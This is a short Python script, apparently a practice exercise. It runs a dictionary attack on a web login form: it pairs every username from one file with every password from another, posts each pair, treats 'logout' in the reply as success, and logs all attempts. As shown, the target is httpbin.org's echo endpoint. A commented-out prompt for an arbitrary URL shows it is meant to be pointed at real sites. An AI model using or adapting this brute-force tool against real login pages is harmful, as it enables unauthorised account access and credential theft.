import requests
import time
import pyinputplus as co
from pathlib import Path as path
import logging

folder = path(__file__).parent

def web_loging():
    logging.basicConfig(
    filename=folder/"web_credential_attempts.log",
    level=logging.INFO,
    format="%(asctime)s - %(message)s")
    # url = co.inputURL("Enter a url here so that i can work on it: ")
    session = requests.Session()


    with open(folder/"urser_file.txt","r") as f :
        data_user = [line.strip() for line in f]
    with open(folder/"user_password.txt","r") as j:
        data_pass = [line.strip() for line in j]
    attempts = 1
    
    for user in data_user:
        for passwd in data_pass:
            print("Program started")
            start = time.time()

            response = session.post ('http://httpbin.org/post',
            data={
                'uname': user,
                'pass': passwd
            }
        )
            print(f"Request took {time.time() - start:.2f} seconds")
            if "logout" in response.text.lower():
                logging.info(f"[ATTEMPT {attempts}] Trying: {user} : {passwd} PASSWORD FOUND")
                print("\nLOGIN SUCCESS!")
                print(f"Total Attempts : {attempts}")
                print(f"Username       : {user}")
                print(f"Password       : {passwd}")                 
                return
            else:
                logging.info(f"[ATTEMPT {attempts}] Trying:{user} : {passwd} FAILED")
                print(f"[ATTEMPT {attempts}] Status Code: {response.status_code}")
                # time.sleep(.05)   
            attempts += 1
    print("SORRY cant find anything")
web_loging()